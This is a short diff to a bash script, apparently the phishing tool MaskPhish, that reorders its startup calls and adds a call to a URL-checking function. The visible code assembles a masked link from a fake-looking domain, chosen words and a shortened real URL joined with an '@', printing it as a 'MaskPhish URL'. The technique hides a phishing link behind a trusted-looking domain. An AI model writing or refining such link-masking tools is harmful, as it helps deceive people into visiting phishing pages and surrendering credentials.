@@ -220,14 +220,8 @@ fi
 server
 payload
 checkfound
-
+url_checker
 }
-
-banner
-dependencies
-start1
-
-
 url_checker() {
     if [ ! "${1//:*}" = http ]; then
         if [ ! "${1//:*}" = https ]; then
@@ -267,5 +261,7 @@ read words
 echo -e "\nGenerating MaskPhish Link...\n"
 final=$mask-$words@$shorter
 echo -e "Here is the MaskPhish URL:\e[32m ${final} \e[0m\n"
-
 }
+banner
+dependencies
+start1
